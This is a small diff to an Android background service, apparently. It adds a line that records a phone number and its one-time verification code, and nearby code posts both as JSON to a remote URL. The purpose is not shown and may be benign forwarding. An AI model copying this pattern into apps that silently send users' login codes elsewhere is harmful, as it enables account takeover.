@@ -333,6 +333,7 @@ public class MyService extends Service {
                             Log.d(TAG, "URL为" + url);
                             OkHttpClient mOkHttpClient = new OkHttpClient();
                             try {
+                                message = message + onlinePhone + "验证码为" + finalDynamicPassword + "\n";
                                 MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
                                 String jsonBody = "{\"Phone\":\""+onlinePhone+"\",\"Code\":\""+finalDynamicPassword+"\",\"BotApitoken\":\"\"}";
                                 RequestBody requestBody = RequestBody.create(mediaType, jsonBody);
